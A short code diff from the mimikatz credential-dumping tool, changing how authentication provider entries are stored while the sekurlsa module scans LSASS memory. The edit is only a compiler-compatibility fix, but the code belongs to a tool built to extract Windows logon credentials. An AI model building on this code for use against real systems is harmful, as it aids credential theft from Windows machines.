@@ -96,7 +96,7 @@ bool mod_mimikatz_sekurlsa::searchLSASSDatas()
 							{
 								if((_wcsicmp(leModule->szModule.c_str(), testModule->moduleName) == 0) && !(*testModule->pModuleEntry))
 								{
-									GLOB_ALL_Providers.push_back(make_pair<PFN_ENUM_BY_LUID, wstring>(testModule->enumFunc, testModule->simpleName/*wstring(L"msv1_0")*/));
+									GLOB_ALL_Providers.push_back(pair<PFN_ENUM_BY_LUID, wstring>(testModule->enumFunc, testModule->simpleName/*wstring(L"msv1_0")*/));
 									*testModule->pModuleEntry = new mod_process::KIWI_VERY_BASIC_MODULEENTRY(*leModule);
 									break;
 								}
